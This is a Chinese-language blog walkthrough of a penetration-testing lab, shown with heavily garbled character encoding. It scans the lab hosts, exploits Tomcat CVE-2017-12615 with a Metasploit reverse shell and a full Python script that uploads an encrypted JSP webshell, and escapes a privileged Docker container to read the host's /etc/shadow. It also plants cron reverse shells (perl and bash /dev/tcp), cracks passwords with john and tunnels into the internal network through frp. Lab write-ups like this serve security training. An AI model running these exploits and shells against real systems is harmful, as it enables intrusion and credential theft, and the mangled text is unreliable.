<strong>DC</strong></li><li>administrator:Test2008ï¼ˆæ”¹æˆ Admin123 å› ä¸ºè¿‡æœŸäº†ï¼‰</li></ul><h1 id="è€ƒç‚¹æè¿°"><a href="#è€ƒç‚¹æè¿°" class="headerlink" title="è€ƒç‚¹æè¿°"></a>è€ƒç‚¹æè¿°</h1><p>æœ¬æ¬¡é¶åœºæ¸—é€<strong>ååºåˆ—åŒ–æ¼æ´ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ã€Tomcatæ¼æ´ã€MSç³»åˆ—æ¼æ´ã€ç«¯å£è½¬å‘æ¼æ´ã€ä»¥åŠåŸŸæ¸—é€</strong>ç­‰å¤šç§ç»„åˆæ¼æ´</p><p><strong>é¶åœºå­¦ä¹ è·¯å¾„ï¼Œå¯å‚è€ƒ</strong></p><ul><li>stæ¼æ´åˆ©ç”¨</li><li>phpmyadmin getshell</li><li>tomcat æ¼æ´åˆ©ç”¨</li><li>dockeré€ƒé€¸</li><li>ms14-068</li><li>sshå¯†é’¥åˆ©ç”¨</li><li>æµé‡è½¬å‘</li><li>å†å²å‘½ä»¤ä¿¡æ¯æ³„éœ²</li><li>åŸŸæ¸—é€</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å…ˆç”¨arp-scanæ‰«ä¸€ä¸‹åŒä¸€ç½‘æ®µå†…çš„ä¸»æœºï¼ŒæŒ‡å®šå¯¹åº”çš„ç½‘å¡æ¥å£</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp-scan -I eth1 -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115223747881.png" alt="image-20241115223747881"></p><p>é‚£å¯ä»¥å¾—çŸ¥192.168.157.128å°±æ˜¯æˆ‘ä»¬çš„å¤–ç½‘webé¶æœº</p><p>æ¥ä¸‹æ¥ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sT -sV 192.168.157.128<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸‹é¢çš„æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 09:39 EST<br>Nmap scan report for 192.168.157.128<br>Host is up (0.0013s latency).<br>Not shown: 996 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>2001/tcp open  http    Jetty 9.2.11.v20150529<br>2002/tcp open  http    Apache Tomcat 8.5.19<br>2003/tcp open  http    Apache httpd 2.4.25<br>MAC Address: 00:0C:29:E3:C5:36 (VMware)<br>Service Info: Host: 172.19.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 41.90 seconds<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªå¼€æ”¾ç«¯å£éƒ½æœ‰æœåŠ¡ï¼Œ2001ã€2002ã€2003ï¼Œ22çš„sshæœåŠ¡ä¸€èˆ¬å…ˆè·³è¿‡</p><p>ç„¶åä¸Šfscanæ‰«ä¸€ä¸‹æ¼æ´å§</p><p>éƒ½èƒ½æ‰«å‡ºæ¥ç›¸å…³çš„æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.157.128:2002 open<br>192.168.157.128:2001 open<br>192.168.157.128:2003 open<br>[*] alive ports len is: 3<br>start vulscan<br>[*] WebTitle http://192.168.157.128:2002 code:200 len:11230  title:Apache Tomcat/8.5.19<br>[*] WebTitle http://192.168.157.128:2001 code:200 len:1077   title:Struts2 Showcase - Fileupload sample<br>[+] PocScan http://192.168.157.128:2002 poc-yaml-iis-put-getshell <br>[+] PocScan http://192.168.157.128:2002 poc-yaml-tomcat-cve-2017-12615-rce        <br>[+] PocScan http://192.168.157.128:2001 poc-yaml-struts2_045 poc1<br></code></pre></td></tr></table></figure><blockquote><p>ä¸æ˜¯ä»–æ€ä¹ˆ2003ç«¯å£æ²¡æ‰«å‡ºæ¥æ´å‘¢ğŸ¤”ï¼Œè¿™æŒ‰ç†æ¥è¯´åº”è¯¥æ˜¯æœ‰çš„å§</p></blockquote><h1 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h1><h2 id="tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"><a href="#tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´" class="headerlink" title="tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"></a>tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</h2><p>é‚£å°±ä¸ç®¡äº†å…ˆæ¥çœ‹ä¸€ä¸‹ä»–çš„æœåŠ¡å§ï¼Œçœ‹ä¸€ä¸‹tomcat-cve-2017-12615-rceæ¼æ´ï¼Œè¿™æ˜¯ä¸€ä¸ªtomcatçš„ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</p><p>ç›´æ¥ç”¨msfæœä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³çš„tomcatçš„cve</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search cve-2017 tomcat<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115230446678.png" alt="image-20241115230446678"></p><p>æ‰¾åˆ°äº†ä¸€ä¸ªå¯¹åº”çš„rceæ¼æ´ï¼Œé‚£å°±æ‰“ä¸€ä¸‹è¯•è¯•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/http/tomcat_jsp_upload_bypass<br>show payloads<br><span class="hljs-built_in">set</span> payload java/jsp_shell_reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.157.129<br><span class="hljs-built_in">set</span> rhost 192.168.157.128<br><span class="hljs-built_in">set</span> rport 2002<br>run<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½å¼¹ä¸€ä¸ªshellå›æ¥äº†</p><p><img src="https://cdn.clown2024.cn/image-20241115230644472.png" alt="image-20241115230644472"></p><p>ä¸è¿‡è¿™æ ·æ“ä½œèµ·æ¥ä¸å¤ªæ–¹ä¾¿ï¼Œå»æ‰¾payloadä¸Šä¼ ä¸€ä¸ªå†°èçš„shellï¼Œæ–¹ä¾¿æˆ‘ä»¬åç»­ä¸Šä¼ æœ¨é©¬</p><p>ç½‘ä¸Šéšä¾¿æ‰¾åˆ°ä¸€ä¸ªexpï¼š<a href="https://www.cnblogs.com/confidant/p/15440233.html">https://www.cnblogs.com/confidant/p/15440233.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#CVE-2017-12615 EXP</span><br>__author__ = <span class="hljs-string">&#x27;çº¸æœº&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> optparse<br><span class="hljs-keyword">import</span> time<br><br><br>parse = optparse.OptionParser(usage = <span class="hljs-string">&#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>,<span class="hljs-string">&#x27;--url&#x27;</span>,dest=<span class="hljs-string">&#x27;URL&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>,<span class="hljs-string">&#x27;--port&#x27;</span>,dest=<span class="hljs-string">&#x27;PORT&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target port[default:8080]&#x27;</span>,default=<span class="hljs-string">&#x27;8080&#x27;</span>)<br><br>options,args = parse.parse_args()<br><span class="hljs-comment">#éªŒè¯å‚æ•°æ˜¯å¦å®Œæ•´</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.URL <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> options.PORT:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\n&#x27;</span>)<br>        exit(<span class="hljs-string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)<br><br>url = options.URL+<span class="hljs-string">&#x27;:&#x27;</span>+options.PORT<br>filename = <span class="hljs-string">&#x27;/backdoor.jsp&#x27;</span><br>payload = filename+<span class="hljs-string">&#x27;?pwd=023&amp;i=&#x27;</span><br><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>&#125;<br><span class="hljs-comment">#æœ¨é©¬</span><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#ä¸Šä¼ æœ¨é©¬æ–‡ä»¶</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">url</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] ç›®æ ‡åœ°å€:&#x27;</span>+url)<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.put(url+filename+<span class="hljs-string">&#x27;/&#x27;</span>,headers=headers,data = data)<br>    <span class="hljs-comment">#print(respond.status_code)</span><br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">201</span> <span class="hljs-keyword">or</span> respond.status_code == <span class="hljs-number">204</span>:<br>      <span class="hljs-comment">#print(&#x27;[*] ç›®æ ‡åœ°å€:&#x27;+url)</span><br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] æœ¨é©¬ä¸Šä¼ æˆåŠŸ&#x27;</span>)<br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] ä¸Šä¼ å¤±è´¥&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment">#å‘½ä»¤æ‰§è¡Œ</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">url,cmd</span>):<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.get(url+payload+cmd)<br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">200</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(respond.text).replace(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).strip())<br><br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] å‘½ä»¤æ‰§è¡Œé”™è¯¯&#x27;</span>)<br><span class="hljs-keyword">if</span> upload(url) == <span class="hljs-number">0</span>:<br>        exit()<br>time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;è¾“å…¥æ‰§è¡Œå‘½ä»¤(quité€€å‡º):&#x27;</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>  cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br>  <span class="hljs-keyword">if</span>(cmd == <span class="hljs-string">&#x27;quit&#x27;</span>):<br>    <span class="hljs-keyword">break</span><br>  attack(url,cmd)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python cve-2017-tomcat.py -u http://192.168.157.128 -p 2002<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115232125447.png" alt="image-20241115232125447"></p><p>ç„¶åå†°èè¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241115232227130.png" alt="image-20241115232227130"></p><p>çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯</p><p><img src="https://cdn.clown2024.cn/image-20241115232453454.png" alt="image-20241115232453454"></p><p>å¯ä»¥çœ‹åˆ°dockerç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç”¨ä¸‹é¢å‘½ä»¤åˆ¤æ–­</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><h2 id="dockeré€ƒé€¸"><a href="#dockeré€ƒé€¸" class="headerlink" title="dockeré€ƒé€¸"></a>dockeré€ƒé€¸</h2><p>é¢˜ç›®è€ƒç‚¹æœ‰æåˆ°dockeré€ƒé€¸çš„çŸ¥è¯†ç‚¹ï¼Œé‚£å°±çœ‹ä¸€ä¸‹dockeré€ƒé€¸è¦æ€ä¹ˆåˆ©ç”¨ï¼Œå‚è€ƒï¼š<a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html">https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html</a></p><p>çœ‹ä¸€ä¸‹æ˜¯å¦æ˜¯ç‰¹æƒæ¨¡å¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/status | grep -qi <span class="hljs-string">&quot;0000003fffffffff&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Is privileged mode&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not privileged mode&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115234729102.png" alt="image-20241115234729102"></p><p>æ ¹æ®æ–‡ç« æ£€æµ‹ä¸‹æ¥åªæœ‰ç‰¹æƒæ¨¡å¼èƒ½å¤Ÿåˆ©ç”¨ï¼Œå…¶ä»–æœåŠ¡å¯èƒ½ä¹Ÿå­˜åœ¨ï¼Œä½†è¿™é‡Œtomcatçš„æœåŠ¡åˆšå¥½èƒ½åˆ©ç”¨ï¼Œå°±ç»§ç»­è¿›è¡Œä¸‹å»</p><p>æŸ¥çœ‹æŒ‚è½½ç£ç›˜è®¾å¤‡</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235254326.png" alt="image-20241115235254326"></p><p>åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†å®¿ä¸»æœºæ–‡ä»¶æŒ‚è½½åˆ° &#x2F;test ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /test &amp;&amp; mount /dev/sda1 /test<br></code></pre></td></tr></table></figure><p>å°è¯•è®¿é—®å®¿ä¸»æœº shadow æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æ­£å¸¸è®¿é—®</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /test/etc/shadow<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235506075.png" alt="image-20241115235506075"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†™å…¥å®šæ—¶ä»»åŠ¡åå¼¹shellç„¶åæ‹¿åˆ°çš„æƒé™ä¹Ÿæ˜¯å®¿ä¸»æœºçš„rootæƒé™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> $<span class="hljs-string">&#x27;* * * * * perl -e \&#x27;</span>use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;192.168.157.129&quot;</span>;<span class="hljs-variable">$p</span>=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;open(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;\&#x27;<span class="hljs-string">&#x27; &gt; /test/var/spool/cron/crontabs/root</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿æ“ä½œè¿˜æ˜¯çœ‹ä¸€ä¸‹èƒ½ä¸èƒ½å†™sshå…¬é’¥æ¥è¿æ¥å§</p><p>å…ˆçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰.sshæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name .ssh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116000516621.png" alt="image-20241116000516621"></p><p>å‘ç°äº†ubuntuçš„.sshæ–‡ä»¶åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/test/home/ubuntu/.ssh<br></code></pre></td></tr></table></figure><p>é‚£å°±å¯ä»¥å†™sshå…¬é’¥ç„¶åè¿œç¨‹ç™»å½•äº†</p><p>ç”Ÿæˆæœ¬åœ°å¯†é’¥å¯¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>ä»¥å‰ç”Ÿæˆè¿‡å¯ä»¥ç›´æ¥ç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241116000827045.png" alt="image-20241116000827045"></p><p>å†™è¿›authorized_keys</p><p><img src="https://cdn.clown2024.cn/image-20241116001043435.png" alt="image-20241116001043435"></p><p>æ¬¸æˆ‘å»å¿˜è®°äº†è¿™æ˜¯ä»…ä¸»æœºæ¨¡å¼äº†ï¼Œæˆ‘termiusè¿ä¸äº†ï¼Œåªèƒ½ç”¨kaliçš„sshï¼Œè€Œä¸”æˆ‘è¯•äº†ä¸€ä¸‹è¿˜è¿ä¸ä¸Šå°±é€†å¤©ï¼Œè¿˜æ˜¯è¦æˆ‘è¾“å…¥å¯†ç ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ ¼å¼å†™é”™äº†ï¼ˆæˆ‘å‘ç°ç›´æ¥ä¼ ä¹Ÿä¸è¡Œï¼‰</p><p>é‚£å°±è¿˜æ˜¯åå¼¹shellå§</p><p><img src="https://cdn.clown2024.cn/image-20241116003807417.png" alt="image-20241116003807417"></p><p>æ€ªäº†ï¼Œå†™è¿›å»åˆå¼¹ä¸è¿‡æ¥äº†ï¼Œçº¢æ¸©äº†ğŸ˜¡</p><p>æ¢æˆbashå¼¹ä¸€ä¸‹çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.157.129/8888 0&gt;&amp;1&quot;</span> &gt; /test/var/spool/cron/crontabs/root<br></code></pre></td></tr></table></figure><p>çº¢æ¸©äº†è¿˜æ˜¯ä¸è¡Œ</p><p>é‚£å°±åªèƒ½ç”¨johnå»çˆ†ä¸€ä¸‹å¯†ç äº†</p><p>æŠŠ&#x2F;etc&#x2F;shadowçš„å†…å®¹ä¿å­˜ä¸‹æ¥ï¼Œç„¶åç›´æ¥johnçˆ†ç ´</p><p><img src="https://cdn.clown2024.cn/image-20241116102516524.png" alt="image-20241116102516524"></p><p>è½»æ¾çˆ†å‡ºå¯†ç ä¸ºubuntuï¼Œç„¶åç”¨sshè¿œç¨‹ç™»å½•ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh ubuntu@192.168.157.128<br></code></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸€ä¸‹eth1çš„åœ°å€ä¿¡æ¯ï¼Œå°±æ˜¯å†…ç½‘åœ°å€çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig eth1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111716201.png" alt="image-20241116111716201"></p><p>å¯ä»¥çŸ¥é“å†…ç½‘åœ°å€192.168.183.128</p><h2 id="struts2æ¼æ´"><a href="#Struts2æ¼æ´" class="headerlink" title="Struts2æ¼æ´"></a>Struts2æ¼æ´</h2><p>2001æ˜¯ä¸€ä¸ªstruts2æœåŠ¡ï¼Œç›´æ¥ä¸Šå·¥å…·ï¼š<a href="https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32">https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32</a></p><p>ç›´æ¥èƒ½æ‰«å‡ºrceæ¼æ´</p><p><img src="https://cdn.clown2024.cn/image-20241116230437845.png" alt="image-20241116230437845"></p><p>é‚£åˆ©ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œå¹²å•¥éƒ½è¡Œäº†ï¼Œé©¬ä¹Ÿéšä¾¿ä½ ä¸Šä¼ ï¼Œå°±ä¸å¤šæ¼”ç¤ºäº†</p><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><h2 id="frpåå‘ä»£ç†"><a href="#frpåå‘ä»£ç†" class="headerlink" title="frpåå‘ä»£ç†"></a>frpåå‘ä»£ç†</h2><p>ç°åœ¨æˆ‘ä»¬å‘¢å°±æ‹¿ä¸‹ä¸€å°è·³æ¿æœºäº†ï¼Œä¸ºäº†æ–¹ä¾¿é¡ºä¾¿ç†Ÿæ‚‰ä¸€ä¸‹frpï¼Œè¿™é‡Œæ­ä¸ªä»£ç†è¿›å»ï¼Œç„¶åå¯ä»¥ç›´æ¥æ‰«ä¸€ä¸‹å†…ç½‘</p><p>å‚è€ƒæ•™ç¨‹ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html</a></p><p>å…ˆå°†æœ¬åœ°çš„frpä¸Šä¼ åˆ°ubuntuçš„æœºå™¨ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">scp -r frp ubuntu@192.168.157.128:/home/ubuntu/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116105558626.png" alt="image-20241116105558626"></p><blockquote><p>è¿™é‡Œæœ‰ç‚¹è¦æ³¨æ„ï¼Œä»–ä¸Šä¼ çš„æ—¶å€™ä¼šç›´æ¥æ‰¾ä½ å½“å‰ç›®å½•ä¸‹çš„frpç›®å½•ï¼Œæ‰€ä»¥å¦‚ä¸Šå›¾è¦ç°åœ¨ubuntuç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªfrpç›®å½•</p></blockquote><p>kaliçš„frpæœåŠ¡ç«¯é…ç½®frps.toml</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">bindPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><span class="hljs-comment">#portï¼Œtokenè‡ªå®šä¹‰ ä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¸€è‡´å³å¯</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frps -c ./frps.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116110345584.png" alt="image-20241116110345584"></p><p>ubuntuçš„å®¢æˆ·ç«¯frpc.tomlé…ç½®</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">serverAddr</span> = <span class="hljs-string">&quot;192.168.157.129&quot;</span> <span class="hljs-comment"># æ”¹ä¸º VPS çš„ IP åœ°å€</span><br><span class="hljs-attr">serverPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><br><span class="hljs-section">[[proxies]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;plugin_socks5&quot;</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attr">remotePort</span> = <span class="hljs-number">60051</span><br><span class="hljs-section">[proxies.plugin]</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;socks5&quot;</span><br><span class="hljs-attr">username</span> = <span class="hljs-string">&quot;0HDFt16cLQJCB&quot;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&quot;JTN276Gp1A&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨å®¢æˆ·ç«¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frpc -c ./frpc.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111031630.png" alt="image-20241116111031630"></p><p>ç„¶åç°åœ¨å°±èƒ½é€šè¿‡60051ç«¯å£èµ°socks5ä»£ç†è®¿é—®å†…ç½‘äº†</p><p>å†é…ç½®ä¸€ä¸‹proxychains4å·¥å…·çš„é…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure><p>é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[ProxyList]<br># add proxy here ...<br># meanwile<br># defaults set to &quot;tor&quot;<br># socks4        127.0.0.1 9050<br># socks5  192.168.172.132 7777<br># socks5 127.0.0.1 8989<br>socks5 127.0.0.1 60051 0HDFt16cLQJCB JTN276Gp1A<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸€å¼€å§‹socks5å¿˜è®°åŠ ä¸Šç”¨æˆ·åå’Œå¯†ç äº†ï¼Œå¯¼è‡´msfè®¿é—®çš„æ—¶å€™è¢«æ‹’ç»è¿æ¥äº†</p></blockquote><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é‚£å°±ç›´æ¥ä¸Šfscanæ‰«å†…ç½‘äº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains ./fscan -h 192.168.183.1/24<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºçš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p><p>å­˜æ´»ä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">(icmp) Target 192.168.183.1   is alive<br>(icmp) Target 192.168.183.130 is alive<br>(icmp) Target 192.168.183.128 is alive<br>(icmp) Target 192.168.183.129 is alive<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶ä»–ä¸¤å°çš„åœ°å€éƒ½æ‰«å‡ºæ¥äº†</p><p>ç«¯å£ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.183.128:22 open<br>192.168.183.1:7680 open<br>192.168.183.129:445 open<br>192.168.183.130:445 open<br>192.168.183.129:139 open<br>192.168.183.1:445 open<br>192.168.183.130:139 open<br>192.168.183.129:135 open<br>192.168.183.1:139 open<br>192.168.183.130:135 open<br>192.168.183.1:135 open<br>192.168.183.130:88 